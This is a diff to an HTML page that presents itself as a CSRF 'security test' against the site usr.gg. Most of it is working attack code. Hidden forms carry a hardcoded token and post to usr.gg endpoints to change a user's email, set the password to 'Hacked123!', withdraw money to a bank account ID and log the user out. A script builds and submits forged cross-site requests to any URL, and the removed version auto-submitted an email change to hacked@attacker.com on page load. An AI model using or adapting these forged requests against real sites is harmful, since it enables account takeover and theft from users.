@@ -1,25 +1,120 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Test</title>
+    <title>CSRF Security Test</title>
+    <style>
+        body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
+        .success { color: green; }
+        .error { color: red; }
+        button { margin: 5px; padding: 8px; }
+    </style>
 </head>
 <body>
-    <h1>NaderKit Testing CSRF Vulnerability</h1>
-    <p> auto-submit to usr.gg</p>
+    <h1>🔐 CSRF Vulnerability Test</h1>
+    <p><strong>Make sure you're logged into usr.gg in another tab!</strong></p>
     
-    <form action="https://usr.gg/settings/email" method="POST" id="csrf-form">
-        <input type="hidden" name="_token" value="rKIzMW3iEgYXgU7dHkiR0eTSaCgOY9s8k6ibS9YB">
-        <input type="hidden" name="email" value="hacked@attacker.com">
-        <!-- Add any other parameters the form normally sends -->
-        <input type="submit" value="Click here if not redirected">
-    </form>
+    <div style="border:1px solid #ccc; padding:15px; margin:20px 0;">
+        <h3>Test Different Endpoints:</h3>
+        
+        <!-- Form 1: Email Change -->
+        <form action="https://usr.gg/settings/email" method="POST" id="form-email">
+            <input type="hidden" name="_token" value="rKIzMW3iEgYXgU7dHkiR0eTSaCgOY9s8k6ibS9YB">
+            <input type="hidden" name="email" value="csrf-test-attempt@test.com">
+            <button type="submit">Test Email Change</button>
+        </form>
+        
+        <!-- Form 2: Password Change (if endpoint exists) -->
+        <form action="https://usr.gg/settings/password" method="POST" id="form-password">
+            <input type="hidden" name="_token" value="rKIzMW3iEgYXgU7dHkiR0eTSaCgOY9s8k6ibS9YB">
+            <input type="hidden" name="password" value="Hacked123!">
+            <input type="hidden" name="password_confirmation" value="Hacked123!">
+            <button type="submit">Test Password Change</button>
+        </form>
+        
+        <!-- Form 3: Withdraw Money (dangerous!) -->
+        <form action="https://usr.gg/wallet/withdraw" method="POST" id="form-withdraw">
+            <input type="hidden" name="_token" value="rKIzMW3iEgYXgU7dHkiR0eTSaCgOY9s8k6ibS9YB">
+            <input type="hidden" name="amount" value="5.00">
+            <input type="hidden" name="method" value="bank">
+            <input type="hidden" name="bank_id" value="9372">
+            <button type="submit">Test Withdrawal</button>
+        </form>
+        
+        <!-- Form 4: Logout -->
+        <form action="https://usr.gg/logout" method="POST" id="form-logout">
+            <input type="hidden" name="_token" value="rKIzMW3iEgYXgU7dHkiR0eTSaCgOY9s8k6ibS9YB">
+            <button type="submit">Test Logout</button>
+        </form>
+    </div>
+    
+    <div style="border:1px solid #f00; padding:15px; background:#ffeeee;">
+        <h3>⚡ Auto-Submit Test (Find the real endpoints first)</h3>
+        <p>1. Open browser DevTools (F12) → Network tab</p>
+        <p>2. Go to usr.gg and perform an action (change email, withdraw)</p>
+        <p>3. Look at the request details:</p>
+        <ul>
+            <li><strong>Request URL:</strong> Copy the exact endpoint</li>
+            <li><strong>Form Data:</strong> Copy all parameters</li>
+            <li><strong>Method:</strong> Usually POST</li>
+        </ul>
+        
+        <div style="background:#fff; padding:10px; border-radius:5px;">
+            <h4>Found the real endpoint? Test auto-submit here:</h4>
+            <input type="text" id="target-url" placeholder="https://usr.gg/settings/email" style="width:100%; padding:5px;">
+            <textarea id="form-params" rows="4" style="width:100%; margin:10px 0;" placeholder='{"_token":"rKIzMW3iEgYXgU7dHkiR0eTSaCgOY9s8k6ibS9YB", "email":"hacked@test.com"}'></textarea>
+            <button onclick="testCustomEndpoint()">Run Custom Test</button>
+        </div>
+    </div>
+    
+    <div style="margin-top:30px;">
+        <h3>Results to look for:</h3>
+        <ul>
+            <li class="success">✅ If email changes → CRITICAL CSRF</li>
+            <li class="success">✅ If withdrawal succeeds → CRITICAL CSRF</li>
+            <li class="error">❌ If you get "Invalid token" → Token validation works</li>
+            <li class="error">❌ If redirected to login → Session validation</li>
+        </ul>
+    </div>
     
     <script>
-        // Auto-submit after page loads
-        window.onload = function() {
-            setTimeout(function() {
-                document.getElementById('csrf-form').submit();
-            }, 1000);
-        };
+        function testCustomEndpoint() {
+            const url = document.getElementById('target-url').value;
+            const paramsText = document.getElementById('form-params').value;
+            
+            try {
+                const params = JSON.parse(paramsText);
+                
+                // Create hidden form
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = url;
+                form.target = '_blank'; // Open in new tab to see result
+                
+                // Add parameters
+                for (const key in params) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = params[key];
+                    form.appendChild(input);
+                }
+                
+                document.body.appendChild(form);
+                form.submit();
+                
+                alert('Test submitted! Check the new tab for results.');
+            } catch(e) {
+                alert('Invalid JSON format. Use format: {"param":"value"}');
+            }
+        }
+        
+        // First, let's discover the real endpoints
+        console.log('To find real endpoints:');
+        console.log('1. Go to usr.gg and open DevTools (F12)');
+        console.log('2. Click Network tab');
+        console.log('3. Perform an action (change email/withdraw)');
+        console.log('4. Right-click the request → Copy → Copy as fetch');
+        console.log('5. Paste here to see the exact endpoint and params');
     </script>
 </body>
 </html>
